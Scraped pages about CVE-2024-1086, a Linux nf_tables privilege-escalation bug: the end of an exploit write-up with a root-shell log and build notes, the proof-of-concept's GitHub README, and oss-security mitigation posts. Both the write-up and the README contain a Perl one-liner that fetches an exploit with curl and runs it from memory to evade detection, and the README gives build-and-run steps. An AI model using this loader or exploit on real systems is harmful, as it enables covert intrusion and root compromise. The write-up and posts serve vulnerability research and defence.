[*] configuring localhost in namespace...
[*] setting up nftables...
[+] running normal privesc
[*] waiting for the calm before the storm...
[*] sending double free buffer packet...
[*] spraying 16000 pte's...
[   13.592791] ------------[ cut here ]------------
[   13.594923] WARNING: CPU: 0 PID: 229 at mm/slab_common.c:985 free_large_kmalloc+0x3c/0x60
...
[   13.746361] ---[ end trace 0000000000000000 ]---
[   13.748375] object pointer: 0x000000003d8afe8c
[*] checking 16000 sprayed pte's for overlap...
[+] confirmed double alloc PMD/PTE
[+] found possible physical kernel base: 0000000014000000
[+] verified modprobe_path/usermodehelper_path: 0000000016877600 ('/sanitycheck')...
[*] overwriting path with PIDs in range 0->4194304...
[   14.409252] process 'exploit' launched '/dev/fd/13' with NULL argv: empty string added
/bin/sh: 0: can't access tty; job control turned off
root@lts-6:/# id
uid=0(root) gid=0(root) groups=0(root)

root@lts-6:/# cat /flag
kernelCTF{v1:mitigation-v3-6.1.55:1705665799:...}

root@lts-6:/#
```

Codeblock 5.1.7.1: An exploit log for an exploitation attempt on the KernelCTF, leading to a root shell.

Practically speaking, the user could copy/paste the PID from the kernel warning into the exploit stdin when working with KernelCTF remote instances, but I wanted to bruteforce PIDs so my exploit works on other infrastructure as well.

The exploit supports fileless execution when the target has perl installed. This is nice when the target filesystem is read-only. It works by setting modprobe\_path to `/proc/<exploit_pid>/fd/<target_script>` among other things.

```
perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  open(my $fh, ">&=".$fd);
  print $fh `curl https://example.com/exploit -s`;
  exec {"/proc/$$/fd/$fd"} "memfd";
'
```

Codeblock 5.1.7.2: An exploit bootstrap script in Perl, which executes the exploit without writing to disk (fileless-execution).

### 5.2. Source code

The exploit source code can be found in my [CVE-2024-1086 PoC repository](https://github.com/Notselwyn/CVE-2024-1086). As with all of my software projects, I tried to focus on developer experience as well. Hence, the exploit source code has been split across several files for the separation of concerns, and only the functions which should be called in other files are exported (put inside of the .h file) whilst all other functions are marked static. This is much like the public/private attributes of OOP languages.

Additionally, I decided to make the exploit crash/exit instead of properly returning errors when an error occurs. I do this since there is no added value in returning error codes, as its purpose is being a stand-alone binary and not a library. Hence, if one decides for whatever reason to embed these functions into a library, they should semantically speaking make the functions return error codes instead.

If I'm missing any important semantics, feel free to send me a DM (using contact details at the bottom of this blogpost).

### 5.3 Compiling the exploit

#### 5.3.1. Dependencies

The exploit has 2 dependencies: `libnftnl-dev` and `libmnl-dev`. Libmnl parses and constructs netlink headers, whilst libnftnl presumably constructs netfilter-like objects for the user such as chains and tables, and serializes them to netlink messages for libmnl. This is a powerful combination which allows the user to do pretty much anything required for the exploit.

Regretfully, I had to do a bit of tweaking for the exploit. In the exploit repository, have added an .a (ar archive) file for the libraries compiled with musl-gcc, which is essentially an .zip for object files which the compilers understand. This allows for statically linking the libraries with musl-gcc. I had to download a seperate `libmnl-dev` version, but this is listed in a section below. Fortunately enough for the end-user, this means they do not have to install the libraries seperately.

#### 5.3.2. Makefile

To statically compile the exploit for KernelCTF, I used the following makefile:

```
SRC_FILES := src/main.c src/env.c src/net.c src/nftnl.c src/file.c
OUT_NAME = ./exploit

# use musl-gcc since statically linking glibc with gcc generated invalid opcodes for qemu
#   and dynamically linking raised glibc ABI versioning errors
CC = musl-gcc

# use custom headers with fixed versions in a musl-gcc compatible manner
# - ./include/libmnl: libmnl v1.0.5
# - ./include/libnftnl: libnftnl v1.2.6
# - ./include/linux-lts-6.1.72: linux v6.1.72
CFLAGS = -I./include -I./include/linux-lts-6.1.72 -Wall -Wno-deprecated-declarations

# use custom object archives compiled with musl-gcc for compatibility. normal ones
#   are used with gcc and have _chk funcs which musl doesn't support
# the versions are the same as the headers above
LIBMNL_PATH = ./lib/libmnl.a
LIBNFTNL_PATH = ./lib/libnftnl.a

exploit: _compile_static _strip_bin
clean:
	rm $(OUT_NAME)

_compile_static:
	$(CC) $(CFLAGS) $(SRC_FILES) -o $(OUT_NAME) -static $(LIBNFTNL_PATH) $(LIBMNL_PATH)
_strip_bin:
	strip $(OUT_NAME)
```

Codeblock 5.3.2.1: The Makefile used to statically compile the exploit.

#### 5.3.3. Static compilation remarks & errors

> This section is just for troubleshooting people who try to static-compile their own exploits.

##### 5.3.3.1. Libmnl not found

One of the issues when living the easy life with apt and compiling with gcc, was that `libmnl-dev` - one of the libraries containing the netlink functions - in the Debian stable repository has an invalid .a file at the time of writing this. When trying to compile statically, this will look like:

```
/usr/bin/ld: cannot find -lmnl: No such file or directory
collect2: error: ld returned 1 exit status
make: *** [Makefile:17: _compile_static] Error 1
```

Codeblock 5.3.3.1.1: Shell stderr output containing an linking error about being unable to resolve libmnl.

To fix this, please install the libmnl package which is currently in the unstable repository: `sudo apt install libmnl-dev/sid` (`*/sid` installs the package from the Debian unstable repo).

Otherwise, just clone the libmnl repository and compile the library yourself with gcc, and create the .a file yourself.

##### 5.3.3.2. Invalid opcodes - AVX fun

The last issue I experienced when compiling the exploit statically using gcc with glibc, was the use of unsupported instructions - specifically unsupported AVX(512) instructions, observed by opening the binary in Ghidra and looking at the RIP address. The x86 extension AVX512 includes instructions for usage of bigger registers supported by server CPUs. Usually gcc uses the architecture and supported instructions of the CPU it is running on to poll its support for instructions, i.e. using CPUID. However, I was compiling the exploit in a QEMU VM with the `-cpu host` argument set, on my Intel Xeon CPU which has support for AVX512.

The issue is that QEMU - at least in that version - does not support AVX512 extensions. So 50% of the time the exploit would raise a CPU trap in QEMU due to unsupported opcodes (instructions). The reason these instructions were executed is yet another rabbit hole.

```
[   15.211423] traps: exploit[167] trap invalid opcode ip:433db9 sp:7ffcb0682ee8 error:0 in exploit[401000+92000]
```

Codeblock 5.3.3.2.1: Dmesg output containing an invalid opcode error (CPU trap).

I solved this by simply removing the `-cpu host` argument of the QEMU VM and compiling the exploit in that VM as it would use the actual CPU properties that QEMU supports, and hence gcc would no longer use AVX512 considering CPUID does not spoof AVX512 support.

Sadly enough, the KernelCTF instances always have the `-cpu host` argument enabled. Fortunately, the KernelCTF community told me I needed to statically compile the exploit with musl-gcc instead, since glibc is not made for static compilation.

## 6. Discussion

### 6.1. The double-free methods

In the blogpost, I present 2 methods to allocate an order==0 page and order==4 page to the same address: draining the PCP lists, and the race condition. The former made the latter obsolete because it is not depending on a race condition.

The race condition method only works properly for VMs with emulated serial TTYs (i.e. not virtio-serial), because the race condition window is too small on physical systems (~1ms instead of 50ms-300ms). Fortunately enough, this delay was 300ms for KernelCTF and hence allowed me to use this method.

I was not satisfied with the quality and stability of this method, so I refined the exploit for longer than a month, and (among other improvements) came up with the 2nd method: draining the PCP list to allocate pages from the buddy-allocator.

When I started writing the exploit, I was not familiar with the internals of the buddy-allocator and the PCP-allocator. Only after investigating the internals of the allocators I understand how I could properly abuse it for the exploit. Hence, one of the biggest lessons I have internalized is fully understanding something before trying to abuse it, because it will always have advantages.

### 6.2. Post-exploitation stability

Because the proof-of-concept exploit in this blogpost is utilizing a sk\_buff double-free, and has to deal with corrupted skb's, we have to deal with noise in the freelist when network activity happens. When a packet is transmitted or received, an skb's will be allocated from and deallocated to the freelist. Currently, we try to minimize this by disabling stdout around double-free time, which helps when the exploit is running over SSH or a reverse shell.

However, on some hardware systems (like Debian in the hardware setup table), it seems the exploit still manages to crash the system after a few seconds. I have not looked into this, but I suspect this may be because the hardware-based test devices are laptops, and therefore have WiFi adapters. Because WiFi frames (which may not even be targetted to the devices) are also skb's, an WiFi connected device on a high-usage WiFi network (such as the test devices) may be unstable. When the WiFi adapter is disabled in BIOS, the exploit runs fine, which supports this theory.

If a researcher wants to increase the stability of the exploit post-exploitation, they would probably want to either manipulate the SLUB allocator to make the corrupted skb unavailable, or use Dirty Pagedirectory to fix this matter.

## 7. Mindset & Signing Off

### 7.1. VR mindset

While tackling this project, I focused on three key objectives: ensuring broad compatibility, resilient stability, and covert execution. In essence, it culminated in a highly-capable kernel privilege-escalation exploit. Additionally, I tried to keep the codebase as elegant as possible, utilizing my software engineering background.

This meant that on top of the 2-month development period, there were 2 months for refining the exploit for high stability and compatibility. I decided to take this path since I wanted to demonstrate my technical capabilities in this blogpost (and to challenge myself).

This meant thinking differently: I needed to abuse intended, data-only behaviour in subsystems which would be broadly available. This is reflected in the exploit techniques, because I only make use of the IPv4 subsystem and virtual memory, which are enabled on nearly all kernel builds. In fact, most work for the exploit was put into hitting specific codepaths (e.g. the packet being sent from 1.1.1.1 to 255.255.255.255) and making it elegant.

Additionally, I'm not exploiting any slab-allocator behaviour for the exploit itself: just for masking sk\_buff objects, and initial kmalloc/kfree calls which are passed down to the page allocators. Because of this, the exploit is not affected by slab-allocator behaviour which tends to change across versions due to new mitigations like random kmalloc caches. Unfortunately, the initial bug requires unprivileged user namespaces and nftables. The other techniques - like Dirty Pagedirectory and PCP draining - should work regardless of this, and hence can be used for real-world exploits

### 7.2. Reflection

I had great fun researching the bug and exploitation techniques, and was really invested in making the exploit work. Never had I ever gotten so much joy developing a project, specifically when dropping the first root shell with the bug. Additionally, I have learned a great deal about the networking subsystem of the Linux kernel (from nftables to IP fragmentation to IP handling code) and the memory management subsystem (from allocators to pagetables).

Of all my experiences in the IT field - ranging from software engineering to network engineering to security engineering - this was by far the most joyful project, and it gave me one of the biggest challenges I have encountered yet.

Additionally, it gave me inspiration for other projects which I want to develop and publish to contribute to the community. But until they are ready to be revealed to the world, they shall remain in the dark. :^)

### 7.3. Credits

I'd like to thank the following people for contributing to the blogpost in various ways:

* @[ky1ebot](https://twitter.com/ky1ebot) (Twitter/X): extensive peer-review.
* @[daanbreur](https://github.com/daanbreur) (Github): assistance with diagram colorscheme.

Additionally, I tried to link every blogpost/article/etc I utilized in the relevant sections. If you believe I reused your technique without credits, please reach out to me, and I will link your blogpost in the relevant section.

### 7.4. Signing off

Thank you for reading, it's been an honor to present this article.

For professional inquiries, please contact notselwyn@pwning.tech ([PGP key](https://pwning.tech/pgp-notselwyn-pwning-tech-DE800B06B04C6635.asc)) as I would love to discuss options and ideas. For other shenanigans, please don't be afraid to slide into my Twitter DMs over at @[notselwyn](https://twitter.com/notselwyn).

Notselwyn‌‌
March 2024

[Featured
## Tickling ksmbd: fuzzing SMB in the Linux kernel

Following the adventure of manually discovering network-based vulnerabilities in the Linux kernel, I'm adding ksmbd-fuzzing functionality to the already extensive kernel-fuzzing tool that is Syzkaller.](/ksmbd-syzkaller/)
Sep 16, 2023
7 min read

[Featured
## Unleashing ksmbd: crafting remote exploits of the Linux kernel

December 22nd 2022: it's Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an](/ksmbd/)
Aug 4, 2023
10 min read

[## How I hacked IoT management apps: the story behind CVE-2022-46640

Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost,](/cve-2022-46640/)
Mar 8, 2023
8 min read

[Pwning Tech](https://pwning.tech) © 2024

[Powered by Ghost](https://ghost.org/)



=== Content from www.openwall.com_59c5babd_20250111_070331.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[<thread-prev]](../../../2024/04/14/1) [[thread-next>]](3) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ZhxdDyIBazJYRDeR@itl-email>
Date: Sun, 14 Apr 2024 18:47:26 -0400
From: Demi Marie Obenour <demi@...isiblethingslab.com>
To: oss-security@...ts.openwall.com
Subject: Re: Linux: Disabling network namespaces

On Sun, Apr 14, 2024 at 09:08:55PM +0200, Solar Designer wrote:
> Hi,
>
> Many Linux kernel vulnerabilities including the recently exploited
> Netfilter CVE-2024-1086 require CAP_NET_ADMIN in a namespace, yet a
> typically recommended mitigation is to disable user namespaces (not just
> network namespaces).
>
> Further, while on Debian/Ubuntu it is possible to disable just
> unprivileged user namespaces with the Debian-specific sysctl
> kernel.unprivileged_userns_clone=0, on other distros we'd have to use
> user.max_user_namespaces=0, which (unnecessarily) prevents starting of
> containers even by root.
>
> Fredrik Nystrom on Rocky Linux Mattermost channel Security pointed out
> that it is reasonable to disable just network namespaces with
> user.max_net_namespaces=0 instead, and that the negative effects of
> doing so and how to cope with them are well-documented for Apptainer,
> with its documentation also covering Docker, Podman, and systemd:
>
> <https://apptainer.org/docs/admin/latest/user_namespace.html#disabling-network-namespaces>
>
> I hope some of us in here find this useful, and maybe we (including
> distros) will start recommending this milder mitigation when sufficient.

Is this still compatible with Firefox?

IMO an ideal solution would be:

1. Provide a privileged helper daemon that sets up containers based on
   user requirements.

2. Port programs that use containers to use this helper.
--
Sincerely,
Demi Marie Obenour (she/her/hers)
Invisible Things Lab

Download attachment "[signature.asc](2/1)" of type "application/pgp-signature" (834 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_fa125b9b_20250111_070332.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNotselwyn%2FCVE-2024-1086)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNotselwyn%2FCVE-2024-1086)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Notselwyn%2FCVE-2024-1086)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Notselwyn](/Notselwyn)
/
**[CVE-2024-1086](/Notselwyn/CVE-2024-1086)**
Public

* [Notifications](/login?return_to=%2FNotselwyn%2FCVE-2024-1086) You must be signed in to change notification settings
* [Fork
  302](/login?return_to=%2FNotselwyn%2FCVE-2024-1086)
* [Star
   2.3k](/login?return_to=%2FNotselwyn%2FCVE-2024-1086)

Universal local privilege escalation Proof-of-Concept exploit for CVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.

[pwning.tech/nftables](https://pwning.tech/nftables "https://pwning.tech/nftables")

### License

[MIT license](/Notselwyn/CVE-2024-1086/blob/main/LICENSE)

[2.3k
stars](/Notselwyn/CVE-2024-1086/stargazers) [302
forks](/Notselwyn/CVE-2024-1086/forks) [Branches](/Notselwyn/CVE-2024-1086/branches) [Tags](/Notselwyn/CVE-2024-1086/tags) [Activity](/Notselwyn/CVE-2024-1086/activity)
 [Star](/login?return_to=%2FNotselwyn%2FCVE-2024-1086)

 [Notifications](/login?return_to=%2FNotselwyn%2FCVE-2024-1086) You must be signed in to change notification settings

* [Code](/Notselwyn/CVE-2024-1086)
* [Issues
  4](/Notselwyn/CVE-2024-1086/issues)
* [Pull requests
  1](/Notselwyn/CVE-2024-1086/pulls)
* [Actions](/Notselwyn/CVE-2024-1086/actions)
* [Projects
  0](/Notselwyn/CVE-2024-1086/projects)
* [Security](/Notselwyn/CVE-2024-1086/security)
* [Insights](/Notselwyn/CVE-2024-1086/pulse)

Additional navigation options

* [Code](/Notselwyn/CVE-2024-1086)
* [Issues](/Notselwyn/CVE-2024-1086/issues)
* [Pull requests](/Notselwyn/CVE-2024-1086/pulls)
* [Actions](/Notselwyn/CVE-2024-1086/actions)
* [Projects](/Notselwyn/CVE-2024-1086/projects)
* [Security](/Notselwyn/CVE-2024-1086/security)
* [Insights](/Notselwyn/CVE-2024-1086/pulse)

# Notselwyn/CVE-2024-1086

    main[Branches](/Notselwyn/CVE-2024-1086/branches)[Tags](/Notselwyn/CVE-2024-1086/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[54 Commits](/Notselwyn/CVE-2024-1086/commits/main/) | | |
| [include](/Notselwyn/CVE-2024-1086/tree/main/include "include") | | [include](/Notselwyn/CVE-2024-1086/tree/main/include "include") |  |  |
| [lib](/Notselwyn/CVE-2024-1086/tree/main/lib "lib") | | [lib](/Notselwyn/CVE-2024-1086/tree/main/lib "lib") |  |  |
| [src](/Notselwyn/CVE-2024-1086/tree/main/src "src") | | [src](/Notselwyn/CVE-2024-1086/tree/main/src "src") |  |  |
| [.gitignore](/Notselwyn/CVE-2024-1086/blob/main/.gitignore ".gitignore") | | [.gitignore](/Notselwyn/CVE-2024-1086/blob/main/.gitignore ".gitignore") |  |  |
| [LICENSE](/Notselwyn/CVE-2024-1086/blob/main/LICENSE "LICENSE") | | [LICENSE](/Notselwyn/CVE-2024-1086/blob/main/LICENSE "LICENSE") |  |  |
| [Makefile](/Notselwyn/CVE-2024-1086/blob/main/Makefile "Makefile") | | [Makefile](/Notselwyn/CVE-2024-1086/blob/main/Makefile "Makefile") |  |  |
| [README.md](/Notselwyn/CVE-2024-1086/blob/main/README.md "README.md") | | [README.md](/Notselwyn/CVE-2024-1086/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# CVE-2024-1086

Universal local privilege escalation Proof-of-Concept exploit for [CVE-2024-1086](https://nvd.nist.gov/vuln/detail/CVE-2024-1086), working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.

exploit\_poc.mp4

## Blogpost / Write-up

A full write-up of the exploit - including background information and loads of useful diagrams - can be found in the [Flipping Pages blogpost](https://pwning.tech/nftables/).

## Affected versions

The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149>, v6.1.76>, v6.6.15>. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.

**Caveats:**

* The exploit does not work on v6.4> kernels with kconfig `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` (including Ubuntu v6.5)
* The exploits requires user namespaces (kconfig `CONFIG_USER_NS=y`), that those user namespaces are unprivileged (sh command `sysctl kernel.unprivileged_userns_clone` = 1), and that nf\_tables is enabled (kconfig `CONFIG_NF_TABLES=y`). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro's have not been tested, but may work as well. Additionally, the exploit has only been tested on x64/amd64.
* The exploit may be *very* unstable on systems with a lot of network activity
  + Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable.
  + On test devices, please turn off WiFi adapters through BIOS.
* The kernel panic (system crash) after running the exploit is a side-effect which deliberately hasn't been fixed to prevent malicious usage of the exploit (i.e. exploitation attempts should now be more noticable, and unpractical in real-world operations). Despite this, it still allows for a working proof-of-concept in lab environments, as the root shell is functional, and persistence through disk is possible.

## Usage

### Configuration

The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in [`src/config.h`](/Notselwyn/CVE-2024-1086/blob/main/src/config.h). If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase `CONFIG_PHYS_MEM`.
If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle `CONFIG_REDIRECT_LOG` to `1` to avoid unnecessary network activity.

### Building

If this is impractical for you, there is an [compiled x64 binary](https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit) with the default config.

```
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
```

Binary: `CVE-2024-1086/exploit`

### Running

Running the exploit is just as trivial:

```
./exploit
```

Fileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:

```
perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  system "curl https://example.com/exploit -s >&$fd";
  exec {"/proc/$$/fd/$fd"} "memfd";
'
```

## Disclaimer

The programs and scripts ("programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.

## About

Universal local privilege escalation Proof-of-Concept exploit for CVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.

[pwning.tech/nftables](https://pwning.tech/nftables "https://pwning.tech/nftables")

### Topics

[exploit](/topics/exploit "Topic: exploit")
[poc](/topics/poc "Topic: poc")
[cve](/topics/cve "Topic: cve")
[lpe](/topics/lpe "Topic: lpe")
[cve-2024-1086](/topics/cve-2024-1086 "Topic: cve-2024-1086")

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/Notselwyn/CVE-2024-1086/activity)
### Stars

[**2.3k**
stars](/Notselwyn/CVE-2024-1086/stargazers)
### Watchers

[**27**
watching](/Notselwyn/CVE-2024-1086/watchers)
### Forks

[**302**
forks](/Notselwyn/CVE-2024-1086/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FNotselwyn%2FCVE-2024-1086&report=Notselwyn+%28user%29)

## [Releases 1](/Notselwyn/CVE-2024-1086/releases)

[x64 build (Debian/Ubuntu)
Latest

Mar 23, 2024](/Notselwyn/CVE-2024-1086/releases/tag/v1.0.0)

## [Packages 0](/users/Notselwyn/packages?repo_name=CVE-2024-1086)

No packages published

## [Contributors 2](/Notselwyn/CVE-2024-1086/graphs/contributors)

* [![@Notselwyn](https://avatars.githubusercontent.com/u/68616630?s=64&v=4)](https://github.com/Notselwyn)
  [**Notselwyn**
  Lau](https://github.com/Notselwyn)
* [![@mauke](https://avatars.githubusercontent.com/u/278465?s=64&v=4)](https://github.com/mauke)
  [**mauke**](https://github.com/mauke)

## Languages

* [C
  97.8%](/Notselwyn/CVE-2024-1086/search?l=c)
* [Batchfile
  2.0%](/Notselwyn/CVE-2024-1086/search?l=batchfile)
* Other
  0.2%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_e981eb66_20250111_070330.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](22) [[next>]](../../../2024/04/11/1) [[<thread-prev]](22) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAKe4=-JL1N+jq2jrADSyCy3tAbpOc8UR0n2LqnrjMwfw_X4Tnw@mail.gmail.com>
Date: Wed, 10 Apr 2024 17:54:00 -0500
From: Jonathan Wright <jonathan@...alinux.org>
To: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-1086: Linux: nf_tables: use-after-free
 vulnerability in the nft_verdict_init() function

For what it's worth for RHEL 8/9 derivatives, the kpatches on my blog have
been used over 1000 times with no reported issues.

On Wed, Apr 10, 2024, 17:52 Solar Designer <solar@...nwall.com> wrote:

> Hi,
>
> Quoting the CVE description:
>
> A use-after-free vulnerability in the Linux kernel's netfilter:
> nf_tables component can be exploited to achieve local privilege
> escalation. The nft_verdict_init() function allows positive values as
> drop error within the hook verdict, and hence the nf_hook_slow()
> function can cause a double free vulnerability when NF_DROP is issued
> with a drop error which resembles NF_ACCEPT.
